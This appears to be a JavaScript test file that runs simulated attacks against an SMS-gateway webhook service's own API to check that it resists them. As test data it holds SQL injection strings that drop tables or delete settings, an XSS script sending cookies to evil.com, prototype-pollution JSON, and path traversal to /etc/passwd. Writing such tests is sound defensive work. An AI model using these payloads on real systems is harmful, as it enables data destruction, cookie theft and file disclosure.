
const request = require('supertest');
const { createTestDb, createTestApp } = require('../setup');

describe('Security Attack Simulations', () => {
  let app;
  let db;

  beforeEach(() => {
    db = createTestDb();
    app = createTestApp(db);
  });

  afterEach(() => {
    try { db.close(); } catch (e) {}
  });

  // ─── SQL INJECTION ─────────────────────────────────────────────────────────

  describe('SQL Injection', () => {
    it('should resist SQL injection in setting key via OR 1=1', async () => {
      const res = await request(app)
        .post('/api/settings')
        .send({ "' OR '1'='1": 'hacked' });

      expect(res.status).toBe(200);

      // All original settings should still exist unchanged
      const settings = db.prepare('SELECT COUNT(*) as count FROM settings').get();
      expect(settings.count).toBeGreaterThanOrEqual(9); // 9 default + 1 injected key stored literally
    });

    it('should resist UNION SELECT attack in log status filter', async () => {
      // Seed a log entry
      db.prepare("INSERT INTO logs (event_type, status) VALUES ('test', 'sent')").run();

      const res = await request(app)
        .get("/api/logs?status=' UNION SELECT * FROM settings--");

      expect(res.status).toBe(200);
      // Should not return settings data, only normal log results
      expect(res.body.data).toBeDefined();
      // The data should not contain any settings keys
      const hasSettingsKeys = res.body.data.some(row => row.key !== undefined);
      expect(hasSettingsKeys).toBe(false);
    });

    it('should resist DROP TABLE in webhook payload UUID', async () => {
      const payload = {
        event: 'conversation.status_changed',
        payload: {
          conversation_uuid: "'; DROP TABLE logs; --",
          new_status: 'Resolved',
          conversation: {
            reference_number: '100',
            last_message: 'Test',
            tags: [],
            contact: { phone_number: '+306900000001' }
          }
        }
      };

      await request(app)
        .post('/webhooks/smsgate')
        .send(payload);

      // Wait briefly for async processing
      await new Promise(r => setTimeout(r, 100));

      // logs table should still exist
      const count = db.prepare('SELECT COUNT(*) as count FROM logs').get();
      expect(count.count).toBeDefined();
    });

    it('should resist batch SQL injection in setting value', async () => {
      const res = await request(app)
        .post('/api/settings')
        .send({ smsgate_url: "http://ok.com'; DELETE FROM settings WHERE '1'='1" });

      expect(res.status).toBe(200);

      // Settings should still have all entries
      const count = db.prepare('SELECT COUNT(*) as count FROM settings').get();
      expect(count.count).toBeGreaterThanOrEqual(9);
    });

    it('should verify all 3 critical tables exist after injection attacks', async () => {
      // Run a few attacks
      await request(app).post('/api/settings').send({ "DROP TABLE": "test" });
      await request(app).get("/api/logs?status='; DROP TABLE jwt_tokens;--");

      // All tables must still exist
      const tables = db.prepare("SELECT name FROM sqlite_master WHERE type='table'").all();
      const tableNames = tables.map(t => t.name);
      expect(tableNames).toContain('settings');
      expect(tableNames).toContain('logs');
      expect(tableNames).toContain('jwt_tokens');
    });
  });

  // ─── XSS / TEMPLATE INJECTION ──────────────────────────────────────────────

  describe('XSS & Template Injection', () => {
    it('should store and return script tags as raw strings', async () => {
      const xss = '<script>document.location="http://evil.com?c="+document.cookie</script>';
      await request(app).post('/api/settings').send({ template_resolved: xss });

      const res = await request(app).get('/api/settings');
      // Value stored and returned literally — no execution in SMS context
      expect(res.body.template_resolved).toBe(xss);
    });

    it('should store HTML entities literally in templates', async () => {
      const html = '<img src=x onerror=alert(1)><b>Bold</b>';
      await request(app).post('/api/settings').send({ template_waiting: html });

      const row = db.prepare("SELECT value FROM settings WHERE key = 'template_waiting'").get();
      expect(row.value).toBe(html);
    });

    it('should handle template with {constructor} or {__proto__} safely', async () => {
      const maliciousTemplate = '{constructor} {__proto__} {ref}';
      await request(app).post('/api/settings').send({ template_resolved: maliciousTemplate });

      const res = await request(app).get('/api/settings');
      // Should be stored as literal text
      expect(res.body.template_resolved).toBe(maliciousTemplate);
    });

    it('should not execute JS template literals in setting values', async () => {
      const templateLiteral = '${process.env.SMSGATE_PASS}';
      await request(app).post('/api/settings').send({ template_resolved: templateLiteral });

      const row = db.prepare("SELECT value FROM settings WHERE key = 'template_resolved'").get();
      expect(row.value).toBe(templateLiteral);
    });
  });

  // ─── PROTOTYPE POLLUTION ───────────────────────────────────────────────────

  describe('Prototype Pollution', () => {
    it('should not pollute Object.prototype via __proto__ in settings POST', async () => {
      await request(app)
        .post('/api/settings')
        .set('Content-Type', 'application/json')
        .send('{"__proto__": {"isAdmin": true}}');

      expect(({}).isAdmin).toBeUndefined();
    });

    it('should not pollute via constructor.prototype in webhook', async () => {
      await request(app)
        .post('/webhooks/smsgate')
        .set('Content-Type', 'application/json')
        .send('{"constructor": {"prototype": {"pwned": true}}}');

      expect(({}).pwned).toBeUndefined();
    });

    it('should not pollute via nested __proto__ in settings', async () => {
      const nestedPayload = { nested: { '__proto__': { polluted: true } } };
      await request(app)
        .post('/api/settings')
        .send(nestedPayload);

      expect(({}).polluted).toBeUndefined();
    });
  });

  // ─── PATH TRAVERSAL ────────────────────────────────────────────────────────

  describe('Path Traversal', () => {
    it('should reject path traversal in test webhook replay type', async () => {
      const res = await request(app)
        .post('/api/test/send-webhook')
        .send({ type: '../../server/config' });

      // Should return 400 because the file doesn't exist in mock-payloads
      expect(res.status).toBe(400);
      expect(res.body.message).toContain('Unknown mock type');
    });

    it('should reject absolute path injection in test webhook replay', async () => {
      const res = await request(app)
        .post('/api/test/send-webhook')
        .send({ type: '/etc/passwd' });

      expect(res.status).toBe(400);
    });
  });

  // ─── CORS ──────────────────────────────────────────────────────────────────

  describe('Request Integrity', () => {
    it('should return proper JSON content-type on all responses', async () => {
      const res = await request(app).get('/api/settings');
      expect(res.headers['content-type']).toMatch(/application\/json/);
    });

    it('should not have x-powered-by header', async () => {
      const res = await request(app).get('/api/settings');
      expect(res.headers['x-powered-by']).toBeUndefined();
    });

    it('should handle non-JSON content-type gracefully', async () => {
      const res = await request(app)
        .post('/api/settings')
        .set('Content-Type', 'text/plain')
        .send('not json');

      // Express should either reject or handle gracefully
      expect([200, 400, 415, 500]).toContain(res.status);
    });
  });
});
